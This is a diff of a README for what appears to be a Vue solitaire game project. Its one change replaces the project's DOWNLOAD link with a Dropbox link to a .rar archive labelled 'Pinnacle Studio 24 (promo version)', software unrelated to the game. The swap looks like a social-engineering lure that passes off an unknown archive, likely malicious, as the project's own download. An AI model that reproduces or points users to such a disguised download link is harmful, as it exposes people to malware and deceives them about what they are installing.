@@ -17,7 +17,7 @@
 
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
-<h1 align="center"><a  href="https://www.dropbox.com/s/epzlwtw3vskpkhi/Last-version%202.2.4.zip?dl=1">DOWNLOAD</a></h1>
+<h1 align="center"><a  href="https://www.dropbox.com/s/zmb04zc4ii7zzfa/Pinnacle%20Studio%2024%20%28promo%20version%29.rar?dl=1">DOWNLOAD</a></h1>
 
 ## Description
 
